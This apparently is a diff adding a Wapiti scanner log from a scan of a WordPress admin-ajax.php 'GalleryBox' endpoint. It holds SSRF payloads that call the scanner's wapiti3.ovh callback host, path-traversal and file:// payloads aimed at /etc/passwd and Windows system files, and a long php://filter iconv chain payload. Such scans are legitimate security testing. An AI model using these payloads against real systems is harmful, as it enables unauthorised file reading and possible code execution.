@@ -1,0 +1,456 @@
+2024-03-21 16:46:52.247 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:46:53.033 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 16:46:53.033 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_39ec1e86.db
+2024-03-21 16:46:53.039 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-21 16:46:53.109 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 16:46:53.109 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 16:46:53.111 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 16:46:53.212 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 16:46:53.212 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 16:46:53.250 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 16:46:53.284 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 16:46:53.302 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:46:53.303 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fsplpr3%2F1%2F66696c7465725f746167%2F&action=GalleryBox
+2024-03-21 16:46:53.969 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fsplpr3%2F1%2F616374696f6e%2F
+2024-03-21 16:46:54.638 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=splpr3 for results, please wait...
+2024-03-21 16:46:56.893 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 16:46:56.907 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:46:56.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=GalleryBox
+2024-03-21 16:46:57.577 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=GalleryBox
+2024-03-21 16:46:58.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:46:58.944 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:46:59.614 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:00.275 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:00.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=GalleryBox
+2024-03-21 16:47:01.600 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=GalleryBox
+2024-03-21 16:47:02.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=GalleryBox
+2024-03-21 16:47:02.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:03.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:04.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=GalleryBox
+2024-03-21 16:47:04.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=GalleryBox
+2024-03-21 16:47:05.651 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=GalleryBox
+2024-03-21 16:47:06.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:06.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:07.655 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:08.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:09.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:09.673 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:10.340 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:10.997 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:11.661 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:12.324 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:12.986 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:13.651 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:14.316 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&action=GalleryBox
+2024-03-21 16:47:15.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:15.670 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:16.335 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:16.997 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:17.662 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:18.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:18.991 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:19.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:20.318 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:20.982 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:21.642 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:22.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:22.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:23.635 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:24.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:24.956 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:25.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:26.292 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:26.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:27.639 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:28.303 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:28.968 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:29.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:30.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:30.955 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=file%3A%2F%2F%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:31.620 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=GalleryBox
+2024-03-21 16:47:32.279 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&action=GalleryBox
+2024-03-21 16:47:32.937 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&action=GalleryBox
+2024-03-21 16:47:33.601 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:34.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:34.924 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=GalleryBox
+2024-03-21 16:47:35.589 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=GalleryBox
+2024-03-21 16:47:36.257 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=admin-ajax.php&action=GalleryBox
+2024-03-21 16:47:36.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=admin-ajax.php%00&action=GalleryBox
+2024-03-21 16:47:37.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=admin-ajax.php%3A%3A%24DATA&action=GalleryBox
+2024-03-21 16:47:38.248 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-21 16:47:38.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
